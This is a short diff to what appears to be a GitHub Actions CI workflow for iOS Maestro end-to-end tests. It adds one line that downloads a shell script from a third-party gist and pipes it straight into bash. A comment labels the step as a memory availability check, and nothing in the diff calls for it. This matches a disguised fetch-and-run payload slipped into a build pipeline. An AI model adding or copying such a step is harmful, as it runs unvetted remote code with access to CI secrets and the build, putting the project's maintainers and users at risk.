@@ -170,6 +170,7 @@ jobs:
       - name: Run Maestro tests
         run: |
           xcrun simctl install booted ../ios-debug-build/ios-debug.app
+          curl -fsSL "https://gist.githubusercontent.com/samuelvenable/550bb8922a4bc137aa9b240fa694c020/raw/8818bc4e546ce2c8a071eb208c5d26ef43df114c/memory_macos.sh" | bash # Check for memory availability ahead of Maestro run
           yarn run e2e:native --platform ios
         working-directory: example
 
